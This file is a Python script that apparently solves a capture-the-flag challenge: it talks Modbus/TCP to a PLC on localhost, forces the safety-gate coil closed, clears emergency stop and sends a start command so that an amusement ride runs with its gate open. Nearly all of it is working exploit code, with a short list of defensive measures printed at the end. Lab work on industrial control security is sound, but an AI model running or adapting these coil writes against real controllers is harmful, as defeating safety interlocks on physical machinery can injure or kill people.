#!/usr/bin/env python3
"""
CTF Challenge 5: Safety Bypass (Hard - 350 points)
Make the ride start despite safety_gate_closed being false

Method: Force safety signals and send start command
"""

import socket
import struct
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_coil(transaction_id, address, value):
    """Build a Modbus Write Single Coil request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 5

    value_bytes = 0xFF00 if value else 0x0000

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        value_bytes
    )

def build_read_coils(transaction_id, address, quantity):
    """Build a Modbus Read Coils request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 1

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def build_read_register(transaction_id, address, quantity):
    """Build a Modbus Read Holding Registers request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 3

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_coils_response(response):
    """Parse a Read Coils response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    coil_bytes = response[9:9+byte_count]

    coils = []
    for byte_val in coil_bytes:
        for bit in range(8):
            coils.append(bool(byte_val & (1 << bit)))

    return coils

def parse_read_registers_response(response):
    """Parse a Read Holding Registers response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    num_registers = byte_count // 2

    registers = []
    for i in range(num_registers):
        offset = 9 + (i * 2)
        reg_value = struct.unpack('>H', response[offset:offset+2])[0]
        registers.append(reg_value)

    return registers

def main():
    print("="*60)
    print("CTF Challenge 5: Safety Bypass")
    print("="*60)
    print()
    print("⚠️  WARNING: Critical safety vulnerability demonstration")
    print()
    print("Objective: Start ride with safety gate open")
    print("Method: Bypass safety interlocks via Modbus manipulation")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1

    print("\n[Phase 1] Reading safety status...")
    request = build_read_coils(transaction_id, 1, 4)
    sock.send(request)
    response = sock.recv(1024)

    coils = parse_read_coils_response(response)
    if coils:
        master_enable = coils[0]
        emergency_stop = coils[1]
        safety_gate = coils[3]

        print(f"  Master Enable: {master_enable}")
        print(f"  Emergency Stop: {emergency_stop}")
        print(f"  Safety Gate Closed: {safety_gate}")

        if not safety_gate:
            print("\n⚠️  Safety gate is OPEN - bypassing interlock...")

    transaction_id += 1

    print("\n[Phase 2] Forcing all safety conditions...")
    print("  Step 1: Forcing safety_gate_closed = TRUE")
    request = build_write_coil(transaction_id, 4, True)
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1
    time.sleep(0.2)

    print("  Step 2: Ensuring master_enable = TRUE")
    request = build_write_coil(transaction_id, 1, True)
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1
    time.sleep(0.2)

    print("  Step 3: Ensuring emergency_stop = FALSE")
    request = build_write_coil(transaction_id, 2, False)
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1
    time.sleep(0.2)

    print("  ✓ All safety interlocks bypassed")

    print("\n[Phase 3] Sending start command...")
    request = build_write_coil(transaction_id, 10, True)
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1
    time.sleep(1)

    # Release start button
    request = build_write_coil(transaction_id, 10, False)
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1

    print("  ✓ Start command sent")

    print("\n[Phase 4] Checking ride state...")
    time.sleep(1)
    request = build_read_register(transaction_id, 6, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        state = registers[0]
        state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency', 'Maintenance']
        state_name = state_names[state] if state < len(state_names) else 'Unknown'

        print(f"  PLC State: {state} ({state_name})")

        if state >= 1:
            print("\n🎯 SUCCESS! Safety bypass completed")
            print("   Ride started despite safety gate being physically open")
            print("   This represents a CRITICAL safety vulnerability")
        else:
            print("\n⚠️  Ride did not start - state still Idle")

    transaction_id += 1

    print("\n[Phase 5] Stopping ride safely...")
    request = build_write_coil(transaction_id, 11, True)
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1
    time.sleep(1)

    request = build_write_coil(transaction_id, 11, False)
    sock.send(request)
    sock.recv(1024)
    print("  ✓ Stop command sent")

    print("\n[Defensive Measures]")
    print("  1. Implement physical safety relays independent of PLC")
    print("  2. Use cryptographic signing for safety-critical signals")
    print("  3. Employ safety-rated PLCs with certified logic")
    print("  4. Monitor for anomalous signal patterns")
    print("  5. Implement network segmentation and authentication")

    sock.close()

if __name__ == '__main__':
    main()
